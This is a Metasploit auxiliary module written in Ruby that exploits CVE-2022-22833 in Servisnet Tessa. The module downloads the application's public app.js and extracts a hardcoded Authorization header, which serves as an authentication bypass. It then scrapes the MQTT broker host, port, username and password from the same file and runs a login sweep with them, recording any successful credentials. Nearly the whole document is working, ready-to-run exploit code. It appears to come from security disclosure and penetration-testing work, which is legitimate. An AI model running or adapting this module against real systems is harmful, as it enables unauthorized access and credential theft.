##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/credential_collection'
require 'metasploit/framework/login_scanner/mqtt'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::MQTT
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Servisnet Tessa - MQTT Credentials Dump (Unauthenticated) (Metasploit)',
      'Description'    => %q(
        This module exploits MQTT creds dump vulnerability in Servisnet Tessa.
		The app.js is publicly available which acts as the backend of the application.
                By exposing a default value for the "Authorization" HTTP header,
                it is possible to make unauthenticated requests to some areas of the application.
                Even MQTT(Message Queuing Telemetry Transport) protocol connection information can be obtained with this method.
                A new admin user can be added to the database with this header obtained in the source code.

        The module tries to log in to the MQTT service with the credentials it has obtained,
        and reflects the response it receives from the service.

      ),
      'References'     =>
        [
          [ 'CVE', 'CVE-2022-22833' ],
          [ 'URL', 'https://pentest.com.tr/exploits/Servisnet-Tessa-MQTT-Credentials-Dump-Unauthenticated.html' ],
          [ 'URL', 'http://www.servisnet.com.tr/en/page/products' ]
        ],
      'Author'         =>
        [
          'Özkan Mustafa AKKUŞ <AkkuS>' # Discovery & PoC & MSF Module @ehakkus
        ],
      'License'        => MSF_LICENSE,
      'DisclosureDate' => "Dec 22 2021",
      'DefaultOptions' =>
        {
          'RPORT' => 443,
          'SSL'   => true
        }
    ))

    register_options([
        OptString.new('TARGETURI',  [true, 'Base path for application', '/'])
    ])
  end
  # split strings to salt
  def split(data, string_to_split)
    word = data.scan(/"#{string_to_split}"\] = "([\S\s]*?)"/)
    string = word.split('"]').join('').split('["').join('')
    return string
  end

  def check_mqtt
   res = send_request_cgi({
   # default.a.get( check
     'uri'     => normalize_uri(target_uri.path, 'js', 'app.js'),
	 'method'  => 'GET'
   })

   if res && res.code == 200 && res.body =~ /connectionMQTT/
      data = res.body
      #word = data.scan(/"#{string_to_split}"\] = "([\S\s]*?)"/)
      mqtt_host = data.scan(/host: '([\S\s]*?)'/)[0][0]
      rhost = mqtt_host.split('mqtts://').join('')
      print_status("MQTT Host: #{mqtt_host}")
      mqtt_port = data.scan(/port: ([\S\s]*?),/)[0][0]
      print_status("MQTT Port: #{mqtt_port}")
      mqtt_end = data.scan(/endpoint: '([\S\s]*?)'/)[0][0]
      print_status("MQTT Endpoint: #{mqtt_end}")
      mqtt_cl = data.scan(/clientId: '([\S\s]*?)'/)[0][0]
      print_status("MQTT clientId: #{mqtt_cl}")
      mqtt_usr = data.scan(/username: '([\S\s]*?)'/)[1][0]
      print_status("MQTT username: #{mqtt_usr}")
      mqtt_pass = data.scan(/password: '([\S\s]*?)'/)[1][0]
      print_status("MQTT password: #{mqtt_pass}")

      print_status("##### Starting MQTT login sweep #####")

      # Removed brute force materials that can be included for the collection.
      cred_collection = Metasploit::Framework::CredentialCollection.new(
        password: mqtt_pass,
        username: mqtt_usr
      )
      # this definition already exists in "auxiliary/scanner/mqtt/connect". Moved into exploit.
      cred_collection = prepend_db_passwords(cred_collection)

      scanner = Metasploit::Framework::LoginScanner::MQTT.new(
        host: rhost,
        port: mqtt_port,
        read_timeout: datastore['READ_TIMEOUT'],
        client_id: client_id,
        proxies: datastore['PROXIES'],
        cred_details: cred_collection,
        stop_on_success: datastore['STOP_ON_SUCCESS'],
        bruteforce_speed: datastore['BRUTEFORCE_SPEED'],
        connection_timeout: datastore['ConnectTimeout'],
        max_send_size: datastore['TCP::max_send_size'],
        send_delay: datastore['TCP::send_delay'],
        framework: framework,
        framework_module: self,
        ssl: datastore['SSL'],
        ssl_version: datastore['SSLVersion'],
        ssl_verify_mode: datastore['SSLVerifyMode'],
        ssl_cipher: datastore['SSLCipher'],
        local_port: datastore['CPORT'],
        local_host: datastore['CHOST']
      )

      scanner.scan! do |result|
        credential_data = result.to_h
        credential_data.merge!(
          module_fullname: fullname,
          workspace_id: myworkspace_id
        )
        password = result.credential.private
        username = result.credential.public
        if result.success?
          credential_core = create_credential(credential_data)
          credential_data[:core] = credential_core
          create_credential_login(credential_data)
          print_good("MQTT Login Successful: #{username}/#{password}")
        else
          invalidate_login(credential_data)
          vprint_error("MQTT LOGIN FAILED: #{username}/#{password} (#{result.proof})")
        end
      end
     end
  end

  def auth_bypass
    res = send_request_cgi({
    # default.a.defaults.headers.post["Authorization"] check
      'uri'     => normalize_uri(target_uri.path, 'js', 'app.js'),
	  'method'  => 'GET'
    })

    if res && res.code == 200 && res.body =~ /default.a.defaults.headers.post/
     token = split(res.body, 'Authorization')
     print_status("Authorization: #{token}")
     return token
    else
     fail_with(Failure::NotVulnerable, 'Target is not vulnerable.')
    end
  end

  def check
    if auth_bypass =~ /Basic/
      return Exploit::CheckCode::Vulnerable
    else
      return Exploit::CheckCode::Safe
    end
  end

  def run
    unless Exploit::CheckCode::Vulnerable == check
      fail_with(Failure::NotVulnerable, 'Target is not vulnerable.')
    end
    check_mqtt
  end
end